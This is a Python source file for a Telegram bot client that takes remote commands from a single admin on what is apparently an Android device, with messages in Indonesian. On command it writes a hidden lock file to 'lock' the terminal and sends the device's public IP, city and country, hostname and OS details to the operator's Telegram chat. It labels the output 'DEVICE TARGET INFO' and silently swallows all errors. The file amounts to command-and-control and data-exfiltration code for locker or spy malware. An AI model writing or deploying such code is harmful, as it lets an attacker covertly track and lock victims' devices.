import requests
import threading
import time
from dotenv import load_dotenv
import os

load_dotenv()

BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID'))

class TelegramBot:
    def __init__(self, device_id):
        self.device_id = device_id
        self.base_url = f"https://api.telegram.org/bot{BOT_TOKEN}"
        self.running = True
        self.locked = False
        
    def send_message(self, text):
        try:
            url = f"{self.base_url}/sendMessage"
            data = {
                "chat_id": ADMIN_ID,
                "text": text,
                "parse_mode": "HTML"
            }
            requests.post(url, json=data, timeout=2)
        except:
            pass
    
    def check_commands(self):
        try:
            url = f"{self.base_url}/getUpdates"
            params = {"timeout": 5, "offset": -1}
            response = requests.get(url, params=params, timeout=3)
            data = response.json()
            
            if data.get("result"):
                for update in data["result"]:
                    if "message" in update:
                        msg = update["message"]
                        if msg.get("from", {}).get("id") == ADMIN_ID:
                            text = msg.get("text", "")
                            self.process_command(text)
        except:
            pass
        return []
    
    def process_command(self, text):
        if text.startswith("/lock_terminal,"):
            parts = text.split(',')
            if len(parts) >= 3 and parts[1].strip() == self.device_id:
                password = parts[2].strip()
                self.locked = True
                with open("/data/local/tmp/.nusan_lock", 'w') as f:
                    f.write("LOCKED")
                self.send_message(f"🔒 Terminal {self.device_id} terkunci!\nPassword: {password}")
        
        elif text.startswith("/unlock_terminal"):
            parts = text.split()
            if len(parts) >= 2 and parts[1] == self.device_id:
                self.locked = False
                if os.path.exists("/data/local/tmp/.nusan_lock"):
                    os.remove("/data/local/tmp/.nusan_lock")
                self.send_message(f"🔓 Terminal {self.device_id} terbuka!")
        
        elif text == "/get_ip":
            self.send_message(f"📡 IP Terminal {self.device_id}: {self.get_ip()}")
        
        elif text == "/get_location":
            loc = self.get_location()
            self.send_message(f"📍 Lokasi Terminal {self.device_id}: {loc}")
        
        elif text == "/device_target":
            info = self.get_device_info()
            self.send_message(info)
    
    def get_ip(self):
        try:
            return requests.get('https://api.ipify.org', timeout=2).text
        except:
            return "Unknown"
    
    def get_location(self):
        try:
            r = requests.get('https://ipinfo.io/json', timeout=2)
            data = r.json()
            return f"{data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}"
        except:
            return "Unknown"
    
    def get_device_info(self):
        import platform
        info = f"""
╔══════════════════════════════╗
║     DEVICE TARGET INFO       ║
╠══════════════════════════════╣
║ Device ID : {self.device_id}
║ Hostname  : {platform.node()}
║ System    : {platform.system()}
║ Release   : {platform.release()}
║ IP        : {self.get_ip()}
║ Status    : {'TERKUNCI 🔒' if self.locked else 'BEBAS 🔓'}
╚══════════════════════════════╝
        """
        return info
    
    def start(self):
        self.send_message(f"🔥 Terminal {self.device_id} online!")
        while self.running:
            try:
                self.check_commands()
                time.sleep(2)
            except:
                time.sleep(5)
